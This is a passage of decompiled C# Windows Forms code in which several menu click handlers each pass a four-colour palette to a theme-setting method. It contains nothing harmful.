				Color.FromArgb(222, 222, 222),
				Color.FromArgb(4, 94, 175),
				Color.FromArgb(30, 175, 4)
			};
			this.method_19(colors_);
		}

		// Token: 0x0600123B RID: 4667 RVA: 0x000BE390 File Offset: 0x000BC590
		private void Clr6ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(0, 122, 204),
				Color.FromArgb(37, 37, 38),
				Color.FromArgb(241, 241, 241),
				Color.FromArgb(87, 116, 48)
			};
			this.method_19(colors_);
		}

		// Token: 0x0600123C RID: 4668 RVA: 0x000BE400 File Offset: 0x000BC600
		private void Clr7ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(45, 40, 62),
				Color.FromArgb(208, 215, 225),
				Color.FromArgb(129, 43, 178),
				Color.FromArgb(158, 165, 172)
			};
			this.method_19(colors_);
		}

		// Token: 0x0600123D RID: 4669 RVA: 0x000BE47C File Offset: 0x000BC67C
		private void Clr8ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(94, 94, 94),
				Color.FromArgb(40, 40, 40),
				Color.FromArgb(198, 198, 198),
				Color.FromArgb(12, 159, 26)
			};
			this.method_19(colors_);
		}

		// Token: 0x0600123E RID: 4670 RVA: 0x000BE4EC File Offset: 0x000BC6EC
		private void Clr9ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Color[] colors_ = new Color[]
			{
				Color.FromArgb(232, 191, 106),
				Color.FromArgb(43, 43, 43),
				Color.FromArgb(169, 183, 198),
				Color.FromArgb(75, 119, 81)
			};
			this.method_19(colors_);
		}
	}
}
